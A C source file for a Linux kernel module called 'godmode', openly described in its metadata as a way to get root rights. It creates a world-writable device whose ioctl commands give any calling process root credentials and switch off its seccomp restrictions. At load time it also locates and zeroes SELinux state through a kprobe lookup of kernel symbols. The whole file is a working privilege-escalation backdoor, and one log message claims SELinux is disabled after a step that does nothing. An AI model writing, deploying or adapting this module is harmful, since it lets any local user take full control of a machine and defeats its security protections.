// SPDX-License-Identifier: GPL-2.0-only
//
#define pr_fmt(fmt) "godmode: " fmt

#include <linux/device/class.h>
#include <linux/device.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/cdev.h>
#include <linux/sched/signal.h>
#include <linux/kprobes.h>

#include <asm/preempt.h>


#define GODMODE_CHARDEV_NAME 	"godmode"
#define GODMODE_MAJOR			(42)
#define GODMODE_MAX_MINORS		(1)

#define GODMODE_DISABLE_SECCOMP _IOC(_IOC_WRITE, 'k', 1, 0) 
#define GODMODE_ENABLE_ROOT		_IOC(_IOC_WRITE, 'k', 2, 0)
#define GODMODE_DISABLE_SELINUX	_IOC(_IOC_WRITE, 'k', 3, 0)

#define GODMODE_DEV_CLASS_MODE ((umode_t)(S_IRUGO|S_IWUGO))

MODULE_DESCRIPTION("pwn express to get godmode root rights");
MODULE_AUTHOR("uglycat");
MODULE_LICENSE("GPL");

static int godmode_open(struct inode *inode, struct file *file);
static int godmode_release(struct inode *inode, struct file *file);
static long godmode_unlocked_ioctl(struct file *file, unsigned int cmd,
			       unsigned long arg);

static int godmode_major;
static int godmode_major_dev;
static struct class *godmode_class;
static struct device *godmode_dev;

static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};

static const struct file_operations fops = {
	.open		= godmode_open,
	.release	= godmode_release,
	.unlocked_ioctl = godmode_unlocked_ioctl,

	.owner = THIS_MODULE,
};

static int godmode_open(struct inode *inode, struct file *file)
{
	return 0;
}

static int godmode_release(struct inode *inode, struct file *file)
{
	return 0;
}

/* Set the TIF_SECCOMP flag in the thread_info structure to disabled */
static void godmode_set_seccomp_flag_off(void)
{
	struct thread_info *ti = current_thread_info();
	
	ti->flags = ti->flags & ~(1 << TIF_SECCOMP);
}

/* Disables seccomp for the task that calls this */
static void godmode_set_secomp_disabled(void)
{
	struct task_struct *ts = current;
	struct seccomp *task_seccomp = &ts->seccomp;

	task_seccomp->mode = SECCOMP_MODE_DISABLED;
}

static void godmode_enable_root(void)
{
	kuid_t kuid = KUIDT_INIT(0);
	kgid_t kgid = KGIDT_INIT(0);
	struct cred *new_cred;

	new_cred = prepare_creds();
	new_cred->uid = kuid;
	new_cred->gid = kgid;
	new_cred->euid = kuid;
	new_cred->egid = kgid;

	commit_creds(new_cred);
}

static void godmode_disable_selinux(void)
{
	unsigned long selinux_init, enforcing_boot_addr, selinux_state;
	typedef int (* selinux_init_t)(void);
	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
	int ret;
	selinux_init_t selinux_init_cb;

	kallsyms_lookup_name_t kallsyms_lookup_name;
	ret = register_kprobe(&kp);
	if (ret) {
		pr_err("[!] cannot register kprobe\n");
		return;
	}

	kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;
	unregister_kprobe(&kp);

	selinux_state = kallsyms_lookup_name("selinux_state");
	if (selinux_state == 0) {
		pr_err("[!] cannot get selinux_state addr\n");
		return;
	}

	memset((void *)selinux_state, 0, sizeof(int));
	pr_info("[!] Cleaned selinux_state\n");

	selinux_init = kallsyms_lookup_name("selinux_init");
	if (selinux_init == 0) {
		pr_err("[!] cannot get selinux_init addr\n");
	} else {
		pr_info("[!] Got selinux_init addr 0x%lx\n", selinux_init);
		selinux_init_cb = (void *)selinux_init;

		enforcing_boot_addr = kallsyms_lookup_name("selinux_enforcing_boot");
		if (enforcing_boot_addr == 0) {
			pr_err("[!] cannot get selinux_enforcing_boot addr\n");
			return;
		}
		pr_info("[!] Cleaned enforcing_boot_addr flag\n");
		memset((void *)enforcing_boot_addr, 0, sizeof(int));
		//pr_info("[!] Try disable SELinux\n");

		(void)(selinux_init_cb);

		pr_info("[!] disabled SELinux\n");

		return;
	}
}

static const char *get_command_str(unsigned int cmd)
{
	switch (cmd) {
		case GODMODE_DISABLE_SECCOMP:
			return "disable_seccomp";

		case GODMODE_ENABLE_ROOT:
			return "enable_root";

		case GODMODE_DISABLE_SELINUX:
			return "disable_selinux";

		default:
			return "unknown";
	}
}

static long godmode_unlocked_ioctl(struct file *file, unsigned int cmd,
								   unsigned long arg)
{
	pr_info("ioctl cmd:%s\n", get_command_str(cmd));

	switch (cmd) {
		case GODMODE_DISABLE_SECCOMP:
			godmode_set_seccomp_flag_off();
			godmode_set_secomp_disabled();
			break;

		case GODMODE_ENABLE_ROOT:
			godmode_enable_root();
			break;

		case GODMODE_DISABLE_SELINUX:
			godmode_disable_selinux();
			break;

		default:
			return -EINVAL;
	}

	return 0L;
}

static char *godmode_devnode(const struct device *dev, umode_t *mode)
{
	if (mode != NULL)
		*mode = GODMODE_DEV_CLASS_MODE;

	return NULL;
}

static int godmode_init(void)
{
	int ret = 0;

	godmode_major = register_chrdev(0, GODMODE_CHARDEV_NAME, &fops);
	if (godmode_major < 0) {
		pr_err("register chardev\n");
		return godmode_major;
	}

	godmode_major_dev = MKDEV(godmode_major, 0);
 	godmode_class = class_create(THIS_MODULE, GODMODE_CHARDEV_NAME);
	if (IS_ERR(godmode_class)) {
		ret = PTR_ERR(godmode_class);
		pr_err("create class\n");
		goto cleanup_unregister;
	}

	godmode_class->devnode = godmode_devnode;
	godmode_dev = device_create(godmode_class, NULL, godmode_major_dev, NULL, GODMODE_CHARDEV_NAME);	
	if (!godmode_dev) {
		class_destroy(godmode_class);
		godmode_class = NULL;
		ret = -ENODEV;
		goto cleanup_unregister;
	}

	pr_info("created dev !");
	godmode_disable_selinux();
	return 0;

cleanup_unregister:
	unregister_chrdev(godmode_major, GODMODE_CHARDEV_NAME);
	godmode_major = -1;
	return ret;
}

static void godmode_exit(void)
{
	pr_info("Bie !");
}

module_init(godmode_init);
module_exit(godmode_exit);
